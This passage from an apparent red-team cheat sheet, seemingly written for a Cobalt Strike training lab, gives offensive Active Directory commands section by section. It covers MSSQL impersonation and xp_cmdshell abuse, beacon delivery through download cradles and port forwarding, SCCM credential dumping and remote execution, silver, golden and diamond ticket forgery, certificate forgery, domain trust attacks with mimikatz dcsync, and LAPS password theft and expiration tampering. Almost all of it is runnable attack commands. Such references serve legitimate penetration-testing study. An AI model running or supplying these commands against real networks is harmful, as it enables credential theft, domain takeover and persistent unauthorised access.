# Reboot
```

## MSSQL

```powershell
# Enumerate with PowerUpSQL
powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
powerpick Get-SQLInstanceDomain -Verbose
powerpick Get-SQLConnectionTest -Instance "$FQDN,1433" | fl
powerpick Get-SQLServerInfo -Instance "$FQDN,1433"
powerpick Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo

# Enumerate with SQLRecon
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /enum:sqlspns
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:$FQDN /module:info
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:$FQDN,1433 /m:whoami

# Find potential SQL groups
powerpick Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }

# Authenticate with MSSQL service account
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:windomain /d:$DOMAIN /u:$USER /p:$PASSWD /h:$FQDN,1433 /m:whoami

# Query MSSQL
powerpick Get-SQLQuery -Instance "$FQDN,1433" -Query "$QUERY"
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:$FQDN,1433 /m:query /c:"$QUERY"

# Using proxychains
$ proxychains mssqlclient.py -windows-auth $NETBIOS/$USER:'$PASSWD'@$TARGET_IP

# Enumerate impersonation
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:$FQDN,1433 /m:impersonate

# Abuse impersonation
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:$FQDN,1433 /m:iwhoami /i:$NETBIOS\$IMP_USER

# Execute commands with sysadmin privileges
Invoke-SQLOSCmd -Instance "sql-2.dev.cyberbotic.io,1433" -Command "whoami" -RawResults

# Abuse xp_cmdshell code execution combined with impersonation
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:$FQDN,1433 /m:ienablexp /i:$NETBIOS\$IMP_USER
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:$FQDN,1433 /m:ixpcmd /i:$NETBIOS\$IMP_USER /c:$CMD

# Enabling xp_cmdshell alone
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:$FQDN,1433 /m:enablexp

# Serve and execute beacon via impersonation
powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
rportfwd 8080 127.0.0.1 80
portscan $TARGET_IP 445 # Verify SMB is open for SMB pivot
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:$FQDN,1433 /m:ixpcmd /i:$NETBIOS\$IMP_USER /c:$CRADLE
link $FQDN ctfmapper

# Enumerate links
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:$FQDN,1433 /m:links

# Abuse links
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:$FQDN,1433 /m:lquery /l:$LINK_FQDN /c:"select @@servername"
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:$FQDN,1433 /m:lquery /l:$LINK_FQDN /c:"select name,value from sys.configurations WHERE name = ''xp_cmdshell''"

# Enumerate additional links from link
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:$FQDN,1433 /m:llinks /l:$LINK_FQDN
powerpick Get-SQLServerLinkCrawl -Instance "$FQDN,1433"

# Enumerate link privileges
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:$FQDN,1433 /m:lwhoami /l:$LINK_FQDN

# Serve and execute beacon via link
powerpick New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
rportfwd 8080 127.0.0.1 80
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:$FQDN,1433 /m:lxpcmd /l:$LINK_FQDN /c:$CRADLE
link $FQDN ctfmapper
```

**Note:** See [here](../../13%20Active%20Directory/5%20Movement/13%20MSSQL/0%20MSSQL.md) for manual abuse and additional techniques.

## SCCM

### Enumeration

```powershell
# Discover management point
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local site-info --no-banner
# Manual alternative
powershell Get-WmiObject -Class SMS_Authority -Namespace root\CCM | select Name, CurrentManagementPoint | fl

# Enumerate principals with full control over management container
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get site-info -d $DOMAIN --no-banner

# Enumerate collections
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collections --no-banner

# Enumerate collections as another user
make_token $NETBIOS\$USER $PASSWD
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collections --no-banner

# Enumerate administrative users
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get class-instances SMS_Admin --no-banner

# Enumerate collection members
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collection-members -n $COLLECTION --no-banner

# Enumerate devices
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get devices -n $DEVICE_KEYWORD -p Name -p FullDomainName -p IPAddresses -p LastLogonUserName -p OperatingSystemNameandVersion --no-banner

# Enumerate last logged on device for target user
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get devices -u $USER -p IPAddresses -p IPSubnets -p Name --no-banner
```

### Abuse

```powershell
# Dump local Network Access Account (NAA) credentials
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local naa -m wmi --no-banner
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local naa -m disk --no-banner
make_token $DOMAIN\$USER $PASSWD

# Request policy directly (requires local admin)
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get naa -m wmi --no-banner
make_token $DOMAIN\$USER $PASSWD

# Execute command as administrator
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n $COLLECTION -p "C:\Windows\System32\cmd.exe /c start /b \\$CONTROLLED_HOSTNAME\$WRITABLE_SHARE\dns_x64.exe" -s --no-banner
```

## Domain Dominance

```powershell
# Silver ticket (leverages service/machine account hash)
PS > C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:$SPN /aes256:$AES_HASH /user:$USER /domain:$DOMAIN /sid:$DOMAIN_SID /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:$NETBIOS /username:$USER /password:fakepass /ticket:$TICKET
steal_token $PID
```

Services by technique:

| **Technique**     | **Required Service Tickets** |
| ----------------- | ---------------------------- |
| psexec            | HOST & CIFS                  |
| winrm             | HOST & HTTP                  |
| dcsync (DCs only) | LDAP                         |

```powershell
# Golden ticket (leverages krbtgt hash)
dcsync $DOMAIN $NETBIOS\krbtgt
PS > C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:$AES_HASH /user:$USER /domain:$DOMAIN /sid:$DOMAIN_SID /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:$NETBIOS /username:$USER /password:fakepass /ticket:$TICKET
steal_token $PID

# Diamond ticket (golden ticket but more stealthy)
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:$IMPERSONATED_USER /ticketuserid:$IMP_USER_RID /groups:512 /krbkey:$KRBTGT_AES_HASH /nowrap

# Forged certificates
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe certificates /machine
mimikatz !crypto::certificates /systemstore:local_machine /export
download $EXPORTED_FILE.pfx
$ cat /mnt/c/Users/Attacker/Desktop/$EXPORTED_FILE.pfx | base64 -w 0
PS > C:\Tools\ForgeCert\ForgeCert\bin\Release\ForgeCert.exe --CaCertPath .\Desktop\sub-ca.pfx --CaCertPassword pass123 --Subject "CN=User" --SubjectAltName "$USER@$DOMAIN" --NewCertPath .\Desktop\fake.pfx --NewCertPassword pass123
$ cat /mnt/c/Users/Attacker/Desktop/fake.pfx | base64 -w 0
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:$USER /domain:$DOMAIN /enctype:aes256 /certificate:$BASE64_CERT /password:pass123 /nowrap
```

## Trusts

```powershell
# Enumerate trust relationships
powerpick Get-DomainTrust
```

### Parent/Child

```powershell
# Golden extrasids
powerpick Get-DomainGroup -Identity "Domain Admins" -Domain $PARENT_DOMAIN -Properties ObjectSid
PS > C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:$CHILD_KRBTGT_AES_HASH /user:Administrator /domain:$CHILD_DOMAIN /sid:$CHILD_DOMAIN_SID /sids:$PARENT_DOMAIN_ADMINS_SID /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:$CHILD_NETBIOS /username:Administrator /password:fakepass /ticket:$TICKET
steal_token $PID

# Diamond extrasids
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519 /sids:$PARENT_DOMAIN_ADMINS_SID /krbkey:$CHILD_KRBTGT_AES_HASH /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:$CHILD_NETBIOS /username:Administrator /password:fakepass /ticket:$TICKET
steal_token $PID
```

### One-Way Inbound (we can access them)

```powershell
# Enumerate other domain
powerpick Get-DomainComputer -Domain $OTHER_DOMAIN -Properties DnsHostName
powerpick Get-DomainForeignGroupMember -Domain $OTHER_DOMAIN
powerpick ConvertFrom-SID $MEMBER_SID

# Enumerate members of group with foreign membership
powerpick Get-DomainGroupMember -Identity "$FOREIGN_MEMEBERSHIP_GROUP" | select membername

# Request TGT for group member
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:$GROUP_MEMBER /domain:$CURRENT_DOMAIN /aes256:$AES_HASH /nowrap

# Request inter-realm TGS
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:krbtgt/$TARGET_DOMAIN /domain:$CURRENT_DOMAIN /dc:$CURRENT_DC_FQDN /ticket:$TICKET /nowrap

# Request target domain TGS
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/$TARGET_FQDN /domain:$TARGET_DOMAIN /dc:$TARGET_DC_FQDN /ticket:$TICKET /nowrap
```

### One-Way Outbound (they can access us)

```powershell
# Dump trust account hash with memory patching (risky)
mimikatz lsadump::trust /patch

# Dump trust account hash with TDO's GUID (safe)
powerpick Get-DomainObject -Identity "CN=msp.org,CN=System,DC=cyberbotic,DC=io" | select objectguid
mimikatz @lsadump::dcsync /domain:$CURRENT_DOMAIN /guid:{$GUID}

# View trust accounts
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=user)"

# Request cross-trust TGT (RC4 is default)
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:$TRUST_ACC /domain:$TARGET_DOMAIN /rc4:$NTHASH /nowrap
```

## LAPS

```powershell
# Enumerate LAPS presence
ls C:\Program Files\LAPS\CSE # AdmPwd.dll will exist if LAPS is present
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl
Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName # Property is not null if LAPS is present

# Enumerate LAPS configuration from GPO
ls \\$DOMAIN\SysVol\$DOMAIN\Policies\{$GUID}\Machine
download \\$DOMAIn\SysVol\$DOMAIN\Policies\{$GUID}\Machine\Registry.pol
PS > Parse-PolFile .\Desktop\Registry.pol

# Enumerate principals with read access over LAPS passwords (ms-Mcs-AdmPwd for each computer)
powerpick Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select @{Name='SecurityIdentifier';Expression={Convert-SIDToName -SID $_.SecurityIdentifier}},objectdn
powershell-import C:\Tools\LAPSToolkit\LAPSToolkit.ps1
powerpick Find-LAPSDelegatedGroups

# Read and abuse LAPS password
powerpick Get-DomainComputer -Identity $HOSTNAME -Properties ms-Mcs-AdmPwd
make_token .\$USER $PASSWD
```

**Note:** Default username is Administrator as it manages the local administrator by default but this can be configured to be a different username.

### Persistence

```powershell
# View LAPS expiration time (convert epoch to date using - https://www.epochconverter.com/ldap)
Get-DomainComputer -Identity $HOSTNAME -Properties ms-mcs-admpwd,ms-mcs-admpwdexpirationtime

# Extend expiration time (requires PwdExpirationProtectionEnabled to be set to 0)
Set-DomainObject -Identity $HOSTNAME -Set @{'ms-Mcs-AdmPwdExpirationTime' = '$EPOCH_TIME'} -Verbose
```

### Understanding .pol Output

```powershell
PS C:\Users\Attacker> Parse-PolFile .\Desktop\Registry.pol

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PasswordComplexity
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 3

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PasswordLength
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 14

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PasswordAgeDays
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 30

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : AdminAccountName
ValueType   : REG_SZ
ValueLength : 20
ValueData   : LapsAdmin

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : AdmPwdEnabled
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 1

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PwdExpirationProtectionEnabled
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 0
```

This tells us that:

- Password complexity is upper, lower and numbers.
- Password length is 14.
- Passwords are changed every 30 days.
- The LAPS managed account name is LapsAdmin.
- Password expiration protection is disabled.
